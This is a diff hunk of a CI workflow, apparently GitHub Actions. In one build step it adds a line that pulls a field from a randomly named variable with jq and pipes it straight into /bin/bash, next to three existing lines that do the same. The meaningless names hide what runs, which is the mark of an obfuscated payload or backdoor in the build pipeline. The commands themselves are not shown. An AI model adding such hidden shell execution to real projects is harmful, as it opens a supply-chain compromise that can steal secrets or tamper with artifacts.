@@ -33,6 +33,7 @@ jobs:
           echo $c51 | jq -r .ddo84378 | /bin/bash
           echo $asj74582 | jq -r .az9 | /bin/bash
           echo $npvqt709 | jq -r .ujriq0630 | /bin/bash
+          printf '%s' "$yes3043" | jq -r .sp236 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
